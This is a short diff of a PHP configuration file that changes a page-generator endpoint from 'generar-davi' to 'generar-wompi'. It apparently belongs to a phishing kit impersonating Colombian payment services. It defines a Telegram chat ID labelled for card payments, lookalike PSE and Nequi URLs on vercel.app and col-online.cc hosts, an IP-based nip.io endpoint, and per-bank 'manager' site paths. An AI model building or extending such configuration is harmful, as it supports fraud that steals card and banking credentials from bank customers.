@@ -15,7 +15,7 @@ define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta
 
 // ── PSE ───────────────────────────────────────────────
 define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
-define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/generar-davi');
+define('RECAUDOFALL_BASE', 'https://recaudofall.94.250.202.215.nip.io/generar-wompi');
 define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');
 
 // Bancos existentes → vercel (/sites/{slug}/manager/{id})
